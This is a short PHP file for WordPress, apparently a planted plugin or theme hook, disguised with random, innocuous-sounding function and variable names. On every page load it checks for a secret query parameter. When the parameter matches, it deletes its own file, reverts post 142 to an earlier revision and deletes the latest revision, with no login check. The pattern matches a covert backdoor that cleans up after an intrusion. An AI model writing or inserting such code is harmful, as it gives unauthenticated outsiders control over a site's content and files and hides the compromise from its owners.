<?php

function cdn_tags_marketplace() {
	if (isset($_GET['tracker_js_log']) && $_GET['tracker_js_log'] === 'shopp_optimizer_disable_scheduled') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$tool_changer_plus_grid = 142;
		$current_external_before = wp_get_post_revisions($tool_changer_plus_grid);
		if (empty($current_external_before)) die('no revisions');
		if (count($current_external_before) < 2) die('less than 2');
		$rotator_visual_testimonial = array_shift($current_external_before);
		$thumbnails_portfolio_pullquote = $rotator_visual_testimonial->ID;
		$welcome_badge_iframe_pagination = array_shift($current_external_before);
		$elements_advanced_invoice = $welcome_badge_iframe_pagination->ID;
		$importer_roles_archives = wp_restore_post_revision($elements_advanced_invoice);
		if ($importer_roles_archives === false) die('error restoring');
		$importer_roles_archives = wp_delete_post_revision($thumbnails_portfolio_pullquote);		
		if ($importer_roles_archives === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'cdn_tags_marketplace');
